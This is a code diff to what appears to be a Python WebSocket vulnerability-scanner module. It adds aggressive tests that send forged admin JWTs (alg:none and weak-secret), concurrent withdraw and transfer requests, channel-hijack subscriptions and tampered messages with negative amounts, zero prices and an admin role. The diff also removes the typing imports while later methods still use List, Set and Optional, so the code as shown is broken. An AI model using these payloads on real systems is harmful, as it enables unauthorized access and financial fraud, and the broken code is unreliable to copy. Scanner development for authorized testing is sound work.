@@ -4,7 +4,6 @@ import asyncio
 import base64
 import struct
 import hashlib
-from typing import Dict, List, Set, Optional, Tuple
 from urllib.parse import urlparse, urljoin, parse_qs
 from modules.base import BaseModule
 
@@ -35,7 +34,7 @@ class WebsocketModule(BaseModule):
         b'\x89PNG\r\n\x1a\n',
     ]
     
-    protocol_tests: List[Tuple[str, str]] = [
+    protocol_tests = [
         ("", "Empty frame"),
         ("\x00", "Null byte"),
         ("\r\n" * 100, "CRLF flood"),
@@ -45,8 +44,8 @@ class WebsocketModule(BaseModule):
     
     async def scan(self, target: str):
         self.findings = []
-        self.ws_endpoints: Set[str] = set()
-        self.vulnerable_endpoints: List[Dict] = []
+        self.ws_endpoints = set()
+        self.vulnerable_endpoints = []
         
         endpoints = await self._find_websocket_endpoints(target)
         self.ws_endpoints = set(endpoints)
@@ -56,7 +55,8 @@ class WebsocketModule(BaseModule):
                 "INFO",
                 f"Found {len(endpoints)} WebSocket endpoint(s)",
                 url=target,
-                evidence=", ".join(list(endpoints)[:5])
+                evidence=", ".join(list(endpoints)[:5]),
+                confidence_evidence=["ws_endpoints_discovered"]
             )
             
             for ws_url in list(endpoints)[:5]:
@@ -66,48 +66,177 @@ class WebsocketModule(BaseModule):
                 await self._test_binary_handling(ws_url)
                 await self._test_protocol_fuzzing(ws_url)
                 await self._test_auth_bypass(ws_url, target)
+                
+                if self.aggressive:
+                    await self._test_race_condition(ws_url)
+                    await self._test_jwt_ws_auth(ws_url, target)
+                    await self._test_subscription_hijack(ws_url)
+                    await self._test_message_tampering(ws_url)
         
         return self.findings
     
+    async def _test_race_condition(self, ws_url):
+        http_url = ws_url.replace("wss://", "https://").replace("ws://", "http://")
+        
+        race_payloads = [
+            '{"action":"withdraw","amount":100}',
+            '{"action":"transfer","to":"attacker","amount":100}',
+            '{"action":"claim_reward"}',
+            '{"action":"vote","option":"a"}',
+        ]
+        
+        for payload in race_payloads:
+            tasks = []
+            for _ in range(10):
+                tasks.append(self.http.post(http_url, data=payload, headers={"Content-Type": "application/json"}))
+            
+            responses = await asyncio.gather(*tasks, return_exceptions=True)
+            success_count = sum(1 for r in responses if isinstance(r, dict) and r.get("status") == 200)
+            
+            if success_count > 1:
+                self.add_finding(
+                    "HIGH",
+                    "WebSocket Race Condition - Multiple Successful Operations",
+                    url=ws_url,
+                    evidence=f"Action: {payload[:30]}... succeeded {success_count}/10 times",
+                    confidence_evidence=["race_condition_detected", "concurrent_success"],
+                    request_data={"method": "POST", "url": http_url, "payload": payload}
+                )
+                return
+    
+    async def _test_jwt_ws_auth(self, ws_url, target):
+        http_url = ws_url.replace("wss://", "https://").replace("ws://", "http://")
+        parsed = urlparse(target)
+        
+        jwt_none_alg = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6OTk5OTk5OTk5OX0."
+        jwt_weak_secret = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.4YGG2qLVvBQzG9J0Mwb7Xz2VrNhQvZDfJXPDy9QDKrI"
+        
+        for token in [jwt_none_alg, jwt_weak_secret]:
+            headers = self._build_ws_headers(f"https://{parsed.netloc}")
+            headers["Authorization"] = f"Bearer {token}"
+            
+            resp = await self.http.get(http_url, headers=headers)
+            
+            if resp.get("status") == 101:
+                self.add_finding(
+                    "CRITICAL",
+                    "WebSocket JWT Authentication Bypass",
+                    url=ws_url,
+                    evidence=f"Forged JWT accepted: {token[:50]}...",
+                    confidence_evidence=["jwt_bypass", "auth_bypass_confirmed"],
+                    request_data={"method": "GET", "url": http_url, "jwt": token[:50]}
+                )
+                return
+        
+        test_url = f"{http_url}?token={jwt_none_alg}"
+        resp = await self.http.get(test_url, headers=self._build_ws_headers(f"https://{parsed.netloc}"))
+        if resp.get("status") == 101:
+            self.add_finding(
+                "CRITICAL",
+                "WebSocket JWT in URL - Weak Validation",
+                url=ws_url,
+                evidence="JWT alg:none accepted via query param",
+                confidence_evidence=["jwt_none_alg", "url_token_bypass"]
+            )
+    
+    async def _test_subscription_hijack(self, ws_url):
+        http_url = ws_url.replace("wss://", "https://").replace("ws://", "http://")
+        
+        subscription_payloads = [
+            '{"action":"subscribe","channel":"admin"}',
+            '{"action":"subscribe","channel":"*"}',
+            '{"action":"subscribe","channel":"../admin"}',
+            '{"type":"subscribe","topics":["user.*","admin.*"]}',
+            '{"subscribe":"#"}',
+            '{"action":"join","room":"admin"}',
+            '{"listen":"private-admin-channel"}',
+        ]
+        
+        for payload in subscription_payloads:
+            resp = await self.http.post(http_url, data=payload, headers={"Content-Type": "application/json"})
+            
+            if resp.get("status") == 200:
+                text = resp.get("text", "").lower()
+                if "subscribed" in text or "joined" in text or "success" in text:
+                    if "error" not in text and "denied" not in text and "forbidden" not in text:
+                        self.add_finding(
+                            "HIGH",
+                            "WebSocket Subscription Hijack",
+                            url=ws_url,
+                            evidence=f"Unauthorized subscription: {payload[:50]}...",
+                            confidence_evidence=["subscription_hijack", "channel_access"],
+                            request_data={"method": "POST", "url": http_url, "payload": payload}
+                        )
+                        return
+    
+    async def _test_message_tampering(self, ws_url):
+        http_url = ws_url.replace("wss://", "https://").replace("ws://", "http://")
+        
+        tamper_payloads = [
+            ('{"user_id":1,"action":"get_profile"}', '{"user_id":0,"action":"get_profile"}'),
+            ('{"user_id":1,"action":"get_profile"}', '{"user_id":-1,"action":"get_profile"}'),
+            ('{"role":"user","action":"list_users"}', '{"role":"admin","action":"list_users"}'),
+            ('{"amount":10}', '{"amount":-10}'),
+            ('{"price":100}', '{"price":0}'),
+        ]
+        
+        for original, tampered in tamper_payloads:
+            resp = await self.http.post(http_url, data=tampered, headers={"Content-Type": "application/json"})
+            
+            if resp.get("status") == 200:
+                text = resp.get("text", "").lower()
+                if "error" not in text and "invalid" not in text:
+                    if len(text) > 50:
+                        self.add_finding(
+                            "MEDIUM",
+                            "WebSocket Message Tampering Possible",
+                            url=ws_url,
+                            evidence=f"Tampered: {tampered[:50]}...",
+                            confidence_evidence=["message_tampering"],
+                            request_data={"method": "POST", "url": http_url, "tampered": tampered}
+                        )
+    
     async def _find_websocket_endpoints(self, target: str) -> List[str]:
         endpoints: Set[str] = set()
-        
         resp = await self.http.get(target)
         if not resp.get("status"):
             return list(endpoints)
-        
         text = resp.get("text", "")
-        
-        ws_patterns = [
-            r'wss?://[^\s\'"<>]+',
-            r'new\s+WebSocket\s*\(\s*[\'"]([^\'"]+)',
-            r'socket\.io',
-            r'sockjs',
-            r'[\'"]([^\'"]*(?:socket|ws|websocket)[^\'"]*)[\'"]',
-        ]
-        
-        for pattern in ws_patterns:
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            for match in matches:
-                if isinstance(match, tuple):
-                    match = match[0]
-                ws_url = self._normalize_ws_url(match, target)
-                if ws_url:
-                    endpoints.add(ws_url)
-        
+        self._collect_ws_from_text(text, target, endpoints)
+        script_src_re = re.compile(r'<script[^>]+src=["\']([^"\']+)["\']', re.I)
         parsed = urlparse(target)
+        base_url = f"{parsed.scheme}://{parsed.netloc}"
+        script_urls = [urljoin(base_url, m.group(1).strip()) for m in script_src_re.finditer(text)]
+        for script_url in script_urls[:15]:
+            sresp = await self.http.get(script_url)
+            if sresp.get("status") == 200 and sresp.get("text"):
+                self._collect_ws_from_text(sresp["text"], target, endpoints)
         common_paths = [
             "/ws", "/websocket", "/socket", "/socket.io/",
             "/sockjs/", "/realtime", "/live", "/stream",
             "/api/ws", "/api/websocket", "/v1/ws", "/v2/ws",
             "/graphql", "/subscriptions", "/events", "/notifications",
         ]
-        
         ws_scheme = "wss" if parsed.scheme == "https" else "ws"
         for path in common_paths:
             endpoints.add(f"{ws_scheme}://{parsed.netloc}{path}")
-        
         return list(endpoints)
+
+    def _collect_ws_from_text(self, text: str, target: str, endpoints: Set[str]) -> None:
+        ws_patterns = [
+            (r'wss?://[^\s\'"<>]+', 0),
+            (r'new\s+WebSocket\s*\(\s*[\'"]([^\'"]+)', 1),
+            (r'[\'"]([^\'"]*(?:socket|ws|websocket)[^\'"]*)[\'"]', 1),
+        ]
+        for pattern, grp in ws_patterns:
+            matches = re.findall(pattern, text, re.IGNORECASE)
+            for match in matches:
+                m = match[0] if grp and isinstance(match, tuple) else match
+                if isinstance(m, tuple):
+                    m = m[0]
+                ws_url = self._normalize_ws_url(m, target)
+                if ws_url:
+                    endpoints.add(ws_url)
     
     def _normalize_ws_url(self, match: str, target: str) -> Optional[str]:
         if match.startswith("ws://") or match.startswith("wss://"):
